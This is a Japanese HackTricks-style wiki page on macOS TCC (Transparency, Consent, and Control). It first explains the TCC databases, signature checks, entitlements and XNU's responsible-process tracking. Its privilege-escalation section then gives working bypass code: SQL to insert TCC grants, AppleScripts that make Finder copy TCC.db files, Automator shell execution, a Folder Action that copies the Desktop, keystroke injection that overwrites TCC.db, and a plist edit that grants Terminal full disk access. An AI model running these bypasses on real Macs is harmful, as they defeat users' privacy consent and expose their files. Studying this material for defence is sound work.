# macOS TCC

{{#include ../../../../banners/hacktricks-training.md}}

## **基本情報**

**TCC (Transparency, Consent, and Control)** は、application の権限を制御することに重点を置いた security protocol です。その主な役割は、**location services、contacts、photos、microphone、camera、accessibility、full disk access** などの機密性の高い機能を保護することです。これらの要素への app access を許可する前に、ユーザーによる明示的な consent を必須とすることで、TCC は privacy とデータに対するユーザーの control を強化します。

application が保護された機能への access を要求すると、ユーザーは TCC に遭遇します。これは、ユーザーが **access を approve または deny** できる prompt として表示されます。さらに、TCC は、**ファイルを application に drag and drop する** といったユーザーによる直接的な操作にも対応しており、特定のファイルへの access を許可できます。これにより、application は明示的に許可されたものにのみ access できます。

![TCC prompt の例](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)

**TCC** は、`/System/Library/PrivateFrameworks/TCC.framework/Support/tccd` に配置された **daemon** によって処理され、`/System/Library/LaunchDaemons/com.apple.tccd.system.plist` で設定されています（mach service `com.apple.tccd.system` を登録します）。

ログイン中のユーザーごとに実行される **user-mode tccd** も存在し、`/System/Library/LaunchAgents/com.apple.tccd.plist` で定義されています。この tccd は mach service `com.apple.tccd` と `com.apple.usernotifications.delegate.com.apple.tccd` を登録します。

ここでは、system と user として実行されている tccd を確認できます。
```bash
ps -ef | grep tcc
0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
```
権限は**親**アプリケーションから**継承**され、**権限**は**Bundle ID**と**Developer ID**に基づいて**追跡**されます。

### TCC Databases

許可/拒否は、以下のTCCデータベースに保存されます。

- システム全体のデータベース **`/Library/Application Support/com.apple.TCC/TCC.db`** 。
- このデータベースは**SIPで保護**されているため、書き込むにはSIP bypassのみが必要です。
- ユーザーごとの設定用TCCデータベース **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`** 。
- このデータベースは保護されているため、Full Disk Accessのような高いTCC権限を持つプロセスのみが書き込めます（ただし、SIPによる保護ではありません）。

> [!WARNING]
> 前述のデータベースは、**読み取りアクセスもTCCで保護**されています。そのため、TCC privileged processからでない限り、通常のユーザーTCCデータベースを**読み取ることはできません**。
>
> ただし、**FDA**や**`kTCCServiceEndpointSecurityClient`**などの高い権限を持つプロセスは、ユーザーのTCCデータベースに書き込めることを覚えておいてください。

- **`/var/db/locationd/clients.plist`**には、**location servicesへのアクセス**を許可されたクライアントを示す**3つ目**のTCCデータベースがあります。
- SIPで保護されたファイル **`/Users/carlospolop/Downloads/REG.db`**（読み取りアクセスもTCCで保護されています）には、**有効なTCCデータベース**の**場所**がすべて含まれています。
- SIPで保護されたファイル **`/Users/carlospolop/Downloads/MDMOverrides.plist`**（読み取りアクセスもTCCで保護されています）には、TCCで付与された権限がさらに含まれています。
- SIPで保護されたファイル **`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`**（誰でも読み取り可能です）には、TCC exceptionが必要なアプリケーションのallow listが含まれています。

> [!TIP]
> **iOS**のTCCデータベースは **`/private/var/mobile/Library/TCC/TCC.db`** にあります。

> [!TIP]
> **notification center UI**は、**system TCC databaseに変更**を加えることができます。
>
> ```bash
> codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/> Support/tccd
> [..]
> com.apple.private.tcc.manager
> com.apple.rootless.storage.TCC
> ```
>
> ただし、ユーザーは**`tccutil`** command line utilityを使ってルールを**削除または照会**できます。

#### データベースの照会

{{#tabs}}
{{#tab name="user DB"}}
```bash
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{{#endtab}}

{{#tab name="system DB"}}
```bash
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Get all FDA
sqlite> select service, client, auth_value, auth_reason from access where service = "kTCCServiceSystemPolicyAllFiles" and auth_value=2;

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{{#endtab}}
{{#endtabs}}

> [!TIP]
> 両方のデータベースを確認すると、アプリが許可している権限、拒否している権限、または未取得の権限（アプリが要求する）を確認できます。

- **`service`** はTCCの**権限**を文字列で表したものです
- **`client`** は権限を持つ**bundle ID**または**バイナリへのパス**です
- **`client_type`** はBundle Identifier(0)か絶対パス(1)かを示します

<details>

<summary>絶対パスの場合の実行方法</summary>

**`launctl load you_bin.plist`** を実行します。plistは次のようにします:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<!-- Label for the job -->
<key>Label</key>
<string>com.example.yourbinary</string>

<!-- The path to the executable -->
<key>Program</key>
<string>/path/to/binary</string>

<!-- Arguments to pass to the executable (if any) -->
<key>ProgramArguments</key>
<array>
<string>arg1</string>
<string>arg2</string>
</array>

<!-- Run at load -->
<key>RunAtLoad</key>
<true/>

<!-- Keep the job alive, restart if necessary -->
<key>KeepAlive</key>
<true/>

<!-- Standard output and error paths (optional) -->
<key>StandardOutPath</key>
<string>/tmp/YourBinary.stdout</string>
<key>StandardErrorPath</key>
<string>/tmp/YourBinary.stderr</string>
</dict>
</plist>
```
</details>

- **`auth_value`** には異なる値を指定できます: denied(0)、unknown(1)、allowed(2)、または limited(3)。
- **`auth_reason`** には次の値を指定できます: Error(1)、User Consent(2)、User Set(3)、System Set(4)、Service Policy(5)、MDM Policy(6)、Override Policy(7)、Missing usage string(8)、Prompt Timeout(9)、Preflight Unknown(10)、Entitled(11)、App Type Policy(12)
- **csreq** フィールドは、実行するバイナリを検証し、TCC permissions を付与する方法を示します:
```bash
# Query to get cserq in printable hex
select service, client, hex(csreq) from access where auth_value=2;

# To decode it (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
BLOB="FADE0C000000003000000001000000060000000200000012636F6D2E6170706C652E5465726D696E616C000000000003"
echo "$BLOB" | xxd -r -p > terminal-csreq.bin
csreq -r- -t < terminal-csreq.bin

# To create a new one (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
REQ_STR=$(codesign -d -r- /Applications/Utilities/Terminal.app/ 2>&1 | awk -F ' => ' '/designated/{print $2}')
echo "$REQ_STR" | csreq -r- -b /tmp/csreq.bin
REQ_HEX=$(xxd -p /tmp/csreq.bin  | tr -d '\n')
echo "X'$REQ_HEX'"
```
- テーブルの**その他のフィールド**については、[**このブログ記事を確認してください**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)。<sup>[[1]](#references)</sup>

`System Preferences --> Security & Privacy --> Privacy --> Files and Folders` で、アプリに**すでに付与されている権限**を確認することもできます。

> [!TIP]
> ユーザーは **`tccutil`** を使用して**ルールを削除またはクエリ**できます。

#### TCC permissions のリセット
```bash
# You can reset all the permissions given to an application with
tccutil reset All app.some.id

# Reset the permissions granted to all apps
tccutil reset All
```
### TCC Signature Checks

TCCの**database**にはアプリケーションの**Bundle ID**が保存されますが、Appから権限の使用を要求しているものが正しいAppであることを**確認する**ため、署名に関する**情報**も**保存**されます。
```bash
# From sqlite
sqlite> select service, client, hex(csreq) from access where auth_value=2;
#Get csreq

# From bash
echo FADE0C00000000CC000000010000000600000007000000060000000F0000000E000000000000000A2A864886F763640601090000000000000000000600000006000000060000000F0000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A364E33385657533542580000000000020000001572752E6B656570636F6465722E54656C656772616D000000 | xxd -r -p - > /tmp/telegram_csreq.bin
## Get signature checks
csreq -t -r /tmp/telegram_csreq.bin
(anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"
```
> [!WARNING]
> したがって、同じ名前と bundle ID を使用する他のアプリケーションは、他のアプリに付与された権限にアクセスできません。

### Entitlements と TCC Permissions

アプリは、一部のリソースへの **アクセスを request** し、**granted access** を得るだけでなく、**関連する entitlements を持つ**必要もあります。\
たとえば **Telegram** には、**カメラへの access を request** するための entitlement `com.apple.security.device.camera` があります。この **entitlement を持たない app は**カメラにアクセスできず（ユーザーに permissions が尋ねられることもありません）。

なお、entitlements は plist ファイルであり、code sig の一部です。さらに special slots によって code sig 内で hash 化されており、kernel code によって kernel から照会されるか、`csops(#169)` または `csops_audittoken(#170)` を使用する user model code によって照会されます。

ただし、アプリが `~/Desktop`、`~/Downloads`、`~/Documents` などの **特定の user folders に access** するために、特定の **entitlements** を持つ必要はありません。システムが access を透過的に処理し、必要に応じて **ユーザーに prompt** を表示します。

- [https://newosxbook.com/ent.php](https://newosxbook.com/ent.php)

Apple のアプリは **prompts を生成しません**。これらのアプリには **entitlements** リスト内に **pre-granted rights** が含まれているため、**popup を生成することはなく**、**TCC databases** のいずれにも表示されません。例：
```bash
codesign -dv --entitlements :- /System/Applications/Calendar.app
[...]
<key>com.apple.private.tcc.allow</key>
<array>
<string>kTCCServiceReminders</string>
<string>kTCCServiceCalendar</string>
<string>kTCCServiceAddressBook</string>
</array>
```
これにより、Calendar がユーザーに reminders、calendar、address book へのアクセスを要求しなくなります。

> [!TIP]
> entitlements に関する公式ドキュメント以外にも、[**https://newosxbook.com/ent.jl**](https://newosxbook.com/ent.jl) で entitlements に関する非公式の **興味深い情報** を確認できます。

一部の TCC permissions には、kTCCServiceAppleEvents、kTCCServiceCalendar、kTCCServicePhotos などがあります。これらすべてを定義した公開リストはありませんが、[**既知のもののリスト**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service) を確認できます。<sup>[[1]](#references)</sup>

### 保護されていない機密性の高い場所

- $HOME (それ自体)
- $HOME/.ssh、$HOME/.aws など
- /tmp

### User Intent / com.apple.macl

前述のとおり、**ファイルを App に drag\&drop することで、App にそのファイルへの access を grant する**ことが可能です。この access は TCC database には記録されず、ファイルの **extended** **attribute** として記録されます。この attribute には、許可された App の **UUID** が保存されます。<sup>[[2]](#references)</sup>
```bash
xattr Desktop/private.txt
com.apple.macl

# Check extra access to the file
## Script from https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command
macl_read Desktop/private.txt
Filename,Header,App UUID
"Desktop/private.txt",0300,769FD8F1-90E0-3206-808C-A8947BEBD6C3

# Get the UUID of the app
otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
```
> [!TIP]
> **`com.apple.macl`**属性がtccdではなく**Sandbox**によって管理されているのは興味深い点です。
>
> また、コンピューター上のアプリのUUIDを許可するファイルを別のコンピューターに移動した場合、同じアプリでも異なるUIDを持つため、そのアプリへのアクセスは許可されないことに注意してください。

拡張属性`com.apple.macl`は、他の拡張属性のように**クリアできません**。これは**SIPによって保護されている**ためです。ただし、[**この投稿で説明されているように**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)、ファイルを**zip化**し、**削除**してから**unzip**することで無効化できます。<sup>[[3]](#references)</sup>






## XNUのResponsible Processメカニズム

macOS/iOSでは、**Responsible Process**メカニズムは、**TCC (Transparency, Consent, and Control)** frameworkやその他のsecurity systemで使用される重要なsecurity featureです。child processのチェーンを経由する場合でも、最終的にあるアクションに責任を持つprocessを追跡します。

TCCがpermission（カメラ、マイク、位置情報など）をチェックする際、requestを実行している直近のprocessを常にチェックするとは限りません。代わりに、**Responsible Process**（通常は、そのアクションを開始したGUI application）をチェックします。実際のrequestがhelper processやdaemonから送信された場合でも同様です。

<details>
<summary>Responsible Processの設定方法</summary>

### Process Structureのフィールド

XNUの各processは、2つの主要なUUID identifierを保持しています。
```c
// From bsd/sys/proc_internal.h
struct proc {
// ...
pid_t   p_responsible_pid;          // PID of the responsible process
uint8_t p_uuid[16];                 // UUID from LC_UUID load command (self)
uint8_t p_responsible_uuid[16];     // UUID of pid responsible for this process
// ...
};
```
- **`p_uuid`**: プロセス自身のUUID（Mach-Oバイナリの`LC_UUID`ロードコマンド由来）
- **`p_responsible_pid`**: 責任プロセスのPID
- **`p_responsible_uuid`**: 責任プロセスのUUID（そのプロセスが終了した後も保持される）

### 責任プロセスの設定方法

1. **プロセス作成時（Fork）**

`fork()`または`posix_spawn()`によって新しいプロセスが作成されると、責任プロセスは親プロセスから継承されます（`exec()` syscallは既存の`proc`構造体を再利用するため、この処理はそこで再度実行されません）。

**Location**: `bsd/kern/kern_fork.c:1053`
```c
// In fork1_internal() - called during all process creation
proc_set_responsible_pid(child_proc, parent_proc->p_responsible_pid);
```
**主なポイント：**
- 子プロセスは親の `p_responsible_pid` を**継承**する
- これにより、プロセス階層を通じた**責任チェーン**が形成される
- 責任プロセスは通常、元の GUI アプリケーションを指す

2. **コア関数：`proc_set_responsible_pid()`**

**場所**：`bsd/kern/kern_proc.c:4817-4831`
```c
void
proc_set_responsible_pid(proc_t target_proc, pid_t responsible_pid)
{
target_proc->p_responsible_pid = responsible_pid;

if (responsible_pid >= 0) {
proc_t responsible_proc = proc_find(responsible_pid);
if (responsible_proc != PROC_NULL) {
// Copy the responsible process's UUID for persistent identification
proc_getexecutableuuid(responsible_proc,
target_proc->p_responsible_uuid,
sizeof(target_proc->p_responsible_uuid));
proc_rele(responsible_proc);
}
}
return;
}
```
**この関数の動作:**
1. **対象プロセスに responsible PID を設定**
2. `proc_find()` を使用して **responsible process を検索**（reference count を増加）
3. responsible process の `p_uuid` から対象プロセスの `p_responsible_uuid` へ **UUID をコピー**
4. `proc_rele()` で **reference を解放**（reference count を減少）

3. **PID と UUID の両方を保存する理由**

この dual-storage アプローチは、重要な問題を解決します。

| フィールド | 目的 | 問題 | 解決策 |
|----------|------|------|------|
| `p_responsible_pid` | 現在のプロセスを高速に検索 | プロセス終了後に PID が再利用される可能性がある | active process の検索に使用 |
| `p_responsible_uuid` | 永続的な識別 | プロセス終了後も保持される | security checks と auditing に使用 |

**問題**: child より先に responsible process が終了すると、PID が再利用され、まったく別のプロセスに割り当てられる可能性があります。

**解決策**: UUID は immutable であり、responsible だった特定の binary を、そのプロセスの終了後も一意に識別します。

### Process Creation Flow
```
┌─────────────────────────────────────────────────────────────┐
│ Parent Process (e.g., Safari)                               │
│ p_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81              │
│ p_responsible_pid: 1234 (points to itself)                 │
│ p_responsible_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81  │
└─────────────────────┬───────────────────────────────────────┘
│
│ fork() / posix_spawn()
▼
┌────────────────────────────┐
│ kern_fork.c:fork1_internal │
│                            │
│ proc_set_responsible_pid(  │
│   child_proc,              │
│   parent->p_responsible_pid│
│ );                         │
└────────────┬───────────────┘
│
▼
┌────────────────────────────┐
│ proc_set_responsible_pid() │
│                            │
│ 1. Set p_responsible_pid   │
│ 2. Find responsible proc   │
│ 3. Copy UUID               │
│ 4. Release reference       │
└────────────┬───────────────┘
│
▼
┌─────────────────────────────────────────────────────────────┐
│ Child Process (e.g., SafariHelper)                          │
│ p_uuid: B266C9DD-8E3F-4AAA-9F1E-71D2E3CDEF82              │
│ p_responsible_pid: 1234 (inherited from parent)            │
│ p_responsible_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81  │
│                     (copied from Safari)                    │
└─────────────────────────────────────────────────────────────┘
```
### UUIDのソース: LC_UUID Load Command

`p_uuid` に格納されているUUIDは、**Mach-O executableの`LC_UUID` load command**に由来します。

1. **Compilation Time**
```bash
# When linking, the linker (ld) generates a unique UUID
$ ld -o myapp myapp.o
# Embedded in the Mach-O binary as LC_UUID load command
```
2. **実行時**

**Location**: `bsd/kern/mach_loader.c:2393-2413`
```c
static load_return_t
load_uuid(struct uuid_command *uulp, char *command_end, load_result_t *result)
{
if ((uulp->cmdsize < sizeof(struct uuid_command)) ||
(((char *)uulp + sizeof(struct uuid_command)) > command_end)) {
return LOAD_BADMACHO;
}

// Extract UUID from LC_UUID load command
memcpy(&result->uuid[0], &uulp->uuid[0], sizeof(result->uuid));
return LOAD_SUCCESS;
}
```
3. **プロセス構造体に保存**

**場所**: `bsd/kern/kern_exec.c:2281`
```c
// After loading the Mach-O binary during exec()
proc_setexecutableuuid(p, &load_result.uuid[0]);
```
**場所**: `bsd/kern/kern_proc.c:1912-1915`
```c
void
proc_setexecutableuuid(proc_t p, const unsigned char *uuid)
{
memcpy(p->p_uuid, uuid, sizeof(p->p_uuid));
}
```
</details>


## TCC Privesc & Bypasses

### TCCへの挿入

ある時点でTCC databaseへのwrite accessを取得できた場合、以下のような方法でentryを追加できます（コメントを削除してください）：

<details>

<summary>TCCへの挿入の例</summary>
```sql
INSERT INTO access (
service,
client,
client_type,
auth_value,
auth_reason,
auth_version,
csreq,
policy_id,
indirect_object_identifier_type,
indirect_object_identifier,
indirect_object_code_identity,
flags,
last_modified,
pid,
pid_version,
boot_uuid,
last_reminded
) VALUES (
'kTCCServiceSystemPolicyDesktopFolder', -- service
'com.googlecode.iterm2', -- client
0, -- client_type (0 - bundle id)
2, -- auth_value  (2 - allowed)
3, -- auth_reason (3 - "User Set")
1, -- auth_version (always 1)
X'FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000', -- csreq is a BLOB, set to NULL for now
NULL, -- policy_id
NULL, -- indirect_object_identifier_type
'UNUSED', -- indirect_object_identifier - default value
NULL, -- indirect_object_code_identity
0, -- flags
strftime('%s', 'now'), -- last_modified with default current timestamp
NULL, -- assuming pid is an integer and optional
NULL, -- assuming pid_version is an integer and optional
'UNUSED', -- default value for boot_uuid
strftime('%s', 'now') -- last_reminded with default current timestamp
);
```
</details>

### TCC Payloads

アプリに侵入でき、TCC permissionsを取得できた場合は、以下のTCC payloadsのページを確認して、それらをabuseしてください:


{{#ref}}
macos-tcc-payloads.md
{{#endref}}

### Apple Events

Apple Eventsについては、以下を参照してください:


{{#ref}}
macos-apple-events.md
{{#endref}}

### Automation (Finder) to FDA\*

Automation permissionのTCC nameは **`kTCCServiceAppleEvents`** です。\
この特定のTCC permissionは、TCC database内で**管理可能なアプリケーション**も示します（そのため、このpermissionだけで全てを管理できるわけではありません）。

**Finder**は**常にFDAを持つ**アプリケーションです（UIに表示されない場合でも同様です）。そのため、Finderに対する**Automation** privilegesがあれば、そのprivilegesをabuseして、**いくつかのactionsを実行させる**ことができます。\
この場合、アプリには **`com.apple.Finder`** に対する **`kTCCServiceAppleEvents`** permissionが必要です。<sup>[[4]](#references)</sup>

{{#tabs}}
{{#tab name="Steal users TCC.db"}}
```applescript
# This AppleScript will copy the system TCC database into /tmp
osascript<<EOD
tell application "Finder"
set homeFolder to path to home folder as string
set sourceFile to (homeFolder & "Library:Application Support:com.apple.TCC:TCC.db") as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{{#endtab}}

{{#tab name="Steal systems TCC.db"}}
```applescript
osascript<<EOD
tell application "Finder"
set sourceFile to POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{{#endtab}}
{{#endtabs}}

これを悪用して、**自分用の TCC database を書き込む**ことができます。

> [!WARNING]
> この permission により、**Finder に TCC restricted folders へのアクセスを要求し、そのファイルを渡させる**ことが可能になります。ただし、私の知る限り、**Finder に arbitrary code を実行させて FDA access を完全に悪用する**ことはできません。
>
> したがって、FDA の機能を完全に悪用することはできません。

これは Finder に対する Automation privileges を取得するための TCC prompt です。

<figure><img src="../../../../images/image (27).png" alt="" width="244"><figcaption></figcaption></figure>

> [!CAUTION]
> **Automator** app には TCC permission **`kTCCServiceAppleEvents`** があるため、Finder などの **任意の app を control** できます。そのため、Automator を control する permission があれば、以下のような code で **Finder も control** できます。

<details>

<summary>Automator 内で shell を取得する</summary>
```applescript
osascript<<EOD
set theScript to "touch /tmp/something"

tell application "Automator"
set actionID to Automator action id "com.apple.RunShellScript"
tell (make new workflow)
add actionID to it
tell last Automator action
set value of setting "inputMethod" to 1
set value of setting "COMMAND_STRING" to theScript
end tell
execute it
end tell
activate
end tell
EOD
# Once inside the shell you can use the previous code to make Finder copy the TCC databases for example and not TCC prompt will appear
```
</details>

**Script Editor app**でも同じことが起こります。Finderを操作できますが、AppleScriptを使用してスクリプトを強制的に実行させることはできません。

### 一部のTCCへのAutomation（SE）

**System EventsはFolder Actionsを作成でき、Folder Actionsは一部のTCCフォルダ**（Desktop、Documents、Downloads）**にアクセスできる**ため、次のようなスクリプトを使用してこの動作を悪用できます。
```bash
# Create script to execute with the action
cat > "/tmp/script.js" <<EOD
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("cp -r $HOME/Desktop /tmp/desktop");
EOD

osacompile -l JavaScript -o "$HOME/Library/Scripts/Folder Action Scripts/script.scpt" "/tmp/script.js"

# Create folder action with System Events in "$HOME/Desktop"
osascript <<EOD
tell application "System Events"
-- Ensure Folder Actions are enabled
set folder actions enabled to true

-- Define the path to the folder and the script
set homeFolder to path to home folder as text
set folderPath to homeFolder & "Desktop"
set scriptPath to homeFolder & "Library:Scripts:Folder Action Scripts:script.scpt"

-- Create or get the Folder Action for the Desktop
if not (exists folder action folderPath) then
make new folder action at end of folder actions with properties {name:folderPath, path:folderPath}
end if
set myFolderAction to folder action folderPath

-- Attach the script to the Folder Action
if not (exists script scriptPath of myFolderAction) then
make new script at end of scripts of myFolderAction with properties {name:scriptPath, path:scriptPath}
end if

-- Enable the Folder Action and the script
enable myFolderAction
end tell
EOD

# File operations in the folder should trigger the Folder Action
touch "$HOME/Desktop/file"
rm "$HOME/Desktop/file"
```
### Automation (SE) + Accessibility (**`kTCCServicePostEvent`|**`kTCCServiceAccessibility`**)** からFDA\*

**`System Events`** に対するAutomation + Accessibility (**`kTCCServicePostEvent`**) により、**プロセスにキーストロークを送信**できます。これにより、Finderを悪用してユーザーのTCC.dbを変更したり、任意のアプリにFDAを付与したりできます（この操作ではパスワードを求められる場合があります）。

FinderによるユーザーのTCC.db上書きの例:
```applescript
-- store the TCC.db file to copy in /tmp
osascript <<EOF
tell application "System Events"
-- Open Finder
tell application "Finder" to activate

-- Open the /tmp directory
keystroke "g" using {command down, shift down}
delay 1
keystroke "/tmp"
delay 1
keystroke return
delay 1

-- Select and copy the file
keystroke "TCC.db"
delay 1
keystroke "c" using {command down}
delay 1

-- Resolve $HOME environment variable
set homePath to system attribute "HOME"

-- Navigate to the Desktop directory under $HOME
keystroke "g" using {command down, shift down}
delay 1
keystroke homePath & "/Library/Application Support/com.apple.TCC"
delay 1
keystroke return
delay 1

-- Check if the file exists in the destination and delete if it does (need to send keystorke code: https://macbiblioblog.blogspot.com/2014/12/key-codes-for-function-and-special-keys.html)
keystroke "TCC.db"
delay 1
keystroke return
delay 1
key code 51 using {command down}
delay 1

-- Paste the file
keystroke "v" using {command down}
end tell
EOF
```
### `kTCCServiceAccessibility` から FDA\*

このページで、FDA\*へのprivescや、例えばkeyloggerの実行に利用できる[**Accessibility permissionsを悪用するpayloads**](macos-tcc-payloads.md#accessibility)を確認してください。

### **Endpoint Security Client から FDA**

**`kTCCServiceEndpointSecurityClient`** を持っている場合、FDAを持っています。以上です。

### System Policy SysAdmin File から FDA

**`kTCCServiceSystemPolicySysAdminFiles`** により、ユーザーの**`NFSHomeDirectory`**属性を**変更**できます。これによってユーザーのhome folderが変更されるため、**TCCをbypass**できます。

### User TCC DB から FDA

**user TCC** databaseに対する**write permissions**を取得しても、自分自身に**`FDA`** permissionsを付与することは**できません**。それを許可できるのは、system databaseに存在するものだけです。

しかし、自分自身に**`Automation rights to Finder`**を付与し、前述のtechniqueを悪用してFDA\*へescalateすることは**できます**。

### **FDA から TCC permissions**

**Full Disk Access**のTCC nameは**`kTCCServiceSystemPolicyAllFiles`**です。

これは実際のprivescではないと思いますが、役立つ場合に備えて説明します。FDAを持つprogramを制御できる場合、**users TCC databaseを変更し、自分自身に任意のaccessを付与**できます。これは、FDA permissionsを失う可能性がある場合のpersistence techniqueとして有用です。

### **SIP Bypass から TCC Bypass**

system **TCC database**は**SIP**によって保護されています。そのため、**指定されたentitlementsを持つprocessesのみが**変更できます。したがって、attackerが**file**に対する**SIP bypass**（SIPによって制限されたfileを変更できる状態）を見つけた場合、以下を実行できます。

- TCC databaseの**protectionを解除**し、自分自身にすべてのTCC permissionsを付与する。例えば、以下のfilesを悪用できます。
- TCC systems database
- REG.db
- MDMOverrides.plist

ただし、この**SIP bypassでTCCをbypass**する別の方法もあります。`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`は、TCC exceptionが必要なapplicationsのallow listです。したがって、attackerがこのfileから**SIP protectionを削除**し、**自分のapplication**を追加できれば、そのapplicationはTCCをbypassできます。\
例えば、terminalを追加するには次のようにします。
```bash
# Get needed info
codesign -d -r- /System/Applications/Utilities/Terminal.app
```
AllowApplicationsList.plist:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Services</key>
<dict>
<key>SystemPolicyAllFiles</key>
<array>
<dict>
<key>CodeRequirement</key>
<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>
<key>IdentifierType</key>
<string>bundleID</string>
<key>Identifier</key>
<string>com.apple.Terminal</string>
</dict>
</array>
</dict>
</dict>
</plist>
```
### TCC Bypass


{{#ref}}
macos-tcc-bypasses/
{{#endref}}

## 参考文献

- [1] [macOS TCC.db の詳細 - Rainforest QA Blog](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
- [2] [maclTrack.command - com.apple.macl を追跡する script（brunerd による Gist）](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
- [3] [com.apple.macl の追跡と対処](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
- [4] [偶然と意図的な手法による macOS TCC のユーザープライバシー保護のバイパス](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)

{{#include ../../../../banners/hacktricks-training.md}}
